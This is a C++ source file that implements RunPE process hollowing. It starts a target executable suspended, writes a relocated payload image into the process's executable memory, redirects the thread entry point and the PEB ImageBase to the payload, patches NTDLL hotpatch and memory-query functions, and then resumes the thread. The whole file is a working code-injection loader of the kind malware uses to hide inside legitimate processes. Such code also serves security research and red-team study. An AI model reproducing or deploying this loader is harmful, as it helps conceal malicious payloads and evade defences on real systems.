#include "run_pe.h"

#include <peconv.h>
#include <iostream>
#include "patch_ntdll.h"

using namespace peconv;
extern bool g_PatchRequired;

bool create_suspended_process(IN LPCTSTR path, IN LPCTSTR cmdLine, OUT PROCESS_INFORMATION &pi)
{
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcess(
            path,
            (LPTSTR) cmdLine,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        std::cerr << "[ERROR] CreateProcess failed, Error = " << std::hex << GetLastError() << "\n";
        return false;
    }
    return true;
}

bool terminate_process(DWORD pid)
{
    bool is_killed = false;
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        return false;
    }
    if (TerminateProcess(hProcess, 0)) {
        is_killed = true;
    }
    else {
        std::cerr << "[ERROR] Could not terminate the process. PID = " << std::dec << pid << std::endl;
    }
    CloseHandle(hProcess);
    return is_killed;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!ReadProcessMemory(hProcess, LPVOID(remote_addr), buffer, buffer_size, NULL)) {
        std::cerr << "[ERROR] Cannot read from the remote memory!\n";
        return false;
    }
    return true;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef _DEBUG
    std::cout << "Writing new EP: " << std::hex << entry_point_va << std::endl;
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target:
        WOW64_CONTEXT context = { 0 };
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast<DWORD>(entry_point_va);

        // 3. Set the changed context into the target:
        return Wow64SetThreadContext(pi.hThread, &context);
    }
#endif
    // 1. Get initial context of the target:
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_M_AMD64)
    context.Rcx = entry_point_va;
#elif defined(_M_ARM64)
    context.X23 = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    // 3. Set the changed context into the target:
    return SetThreadContext(pi.hThread, &context);
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi, bool is32bit)
{
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target:
        WOW64_CONTEXT context;
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast<ULONGLONG>(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return 0;
    }
#if defined(_M_AMD64)
    PEB_addr = context.Rdx;
#elif defined(_M_ARM64)
    PEB_addr = context.X23;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}
inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
/*
We calculate this offset in relation to PEB,
that is defined in the following way
(source "ntddk.h"):

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace; // size: 1
    BOOLEAN ReadImageFileExecOptions; // size : 1
    BOOLEAN BeingDebugged; // size : 1
    BOOLEAN SpareBool; // size : 1
                    // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
    HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit
                   
    PVOID ImageBaseAddress;
    [...]
    */
    ULONGLONG img_base_offset = is32bit ? 
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point(pi, ep_va, is32bit) == FALSE) {
        std::cerr << "Cannot update remote EP!\n";
        return false;
    }
    //3. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!\n";
        return false;
    }
    // get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    //4. Write the payload's ImageBase into remote process' PEB:
    if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
        &load_base, img_base_size, 
        &written)) 
    {
        std::cerr << "Cannot update ImageBaseAddress!\n";
        return false;
    }
    return true;
}

bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi, bool is32bit)
{
    if (loaded_pe == NULL) return false;

    //1. Allocate memory for the payload in the remote process:
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL)  {
        std::cerr << "Could not allocate memory in the remote process\n";
        return false;
    }
#ifdef _DEBUG
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));
#endif
    //2. Relocate the payload (local copy) to the Remote Base:
    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
        std::cout << "Could not relocate the module!\n";
        return false;
    }
    //3. Update the image base of the payload (local copy) to the Remote Base:
    update_image_base(loaded_pe, (ULONGLONG) remoteBase);

    //4. Write the payload to the remote process, at the Remote Base:
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &written)) {
        std::cout << "Writing to the remote process failed!\n";
        return false;
    }

    printf("Loaded at: %p\n", remoteBase);

    //5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
    if (!redirect_to_payload(loaded_pe, remoteBase, pi, is32bit)) {
        std::cerr << "Redirecting failed!\n";
        return false;
    }
    if (!is32bit && g_PatchRequired && !patch_ZwQueryVirtualMemory(pi.hProcess, remoteBase)) {
        std::cout << "ERROR: failed to apply the required patch on NTDLL\n";
    }
    std::cout << "Resuming the process: " << std::dec << pi.dwProcessId << std::endl;
    //6. Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
}

bool is_target_compatibile(BYTE *payload_buf, size_t payload_size, LPCTSTR targetPath)
{
    if (!payload_buf) {
        return false;
    }
    const WORD payload_subs = peconv::get_subsystem(payload_buf);

    size_t target_size = 0;
    BYTE* target_pe = load_pe_module(targetPath, target_size, false, false);
    if (!target_pe) {
        return false;
    }
    const WORD target_subs = peconv::get_subsystem(target_pe);
    const bool is64bit_target = peconv::is64bit(target_pe);
    peconv::free_pe_buffer(target_pe); target_pe = NULL; target_size = 0;

    if (is64bit_target != peconv::is64bit(payload_buf)) {
        std::cerr << "Incompatibile target bitness!\n";
        return false;
    }
    if (payload_subs != IMAGE_SUBSYSTEM_WINDOWS_GUI //only a payload with GUI subsystem can be run by both GUI and CLI
        && target_subs != payload_subs)
    {
        std::cerr << "Incompatibile target subsystem!\n";
        return false;
    }
    return true;
}

bool run_pe(IN LPCTSTR payloadPath, IN LPCTSTR targetPath, IN LPCTSTR cmdLine)
{
    //1. Load the payload:
    size_t payloadImageSize = 0;
    // Load the current executable from the file with the help of libpeconv:
    BYTE* loaded_pe = peconv::load_pe_module(payloadPath, payloadImageSize, false, false);
    if (!loaded_pe) {
        std::cerr << "Loading failed!\n";
        return false;
    }
    // Get the payload's architecture and check if it is compatibile with the loader:
    const WORD payload_arch = get_nt_hdr_architecture(loaded_pe);
    if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Not supported paylad architecture!\n";
        return false;
    }
    const bool is32bit_payload = !peconv::is64bit(loaded_pe);
#ifndef _WIN64
    if (!is32bit_payload) {
        std::cerr << "Incompatibile payload architecture!\n"
            << "Only 32 bit payloads can be injected from 32bit loader!\n";
        return false;
    }
#endif
    // 2. Prepare the taget
    if (targetPath == NULL) {
        std::cerr << "No target supplied!\n";
        return false;
    }
    if (!is_target_compatibile(loaded_pe, payloadImageSize, targetPath)) {
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }
    // Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_suspended_process(targetPath, cmdLine, pi);
    if (!is_created) {
        std::cerr << "Creating target process failed!\n";
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }
    if (g_PatchRequired) {
#ifndef _WIN64
        patch_NtManageHotPatch32(pi.hProcess);
#else
        patch_NtManageHotPatch64(pi.hProcess);
#endif
    }
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadImageSize, pi, is32bit_payload);
    //4. Cleanup:
    if (!isOk) { //if injection failed, kill the process
        terminate_process(pi.dwProcessId);
    }
    free_pe_buffer(loaded_pe, payloadImageSize);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    //---
    return isOk;
}
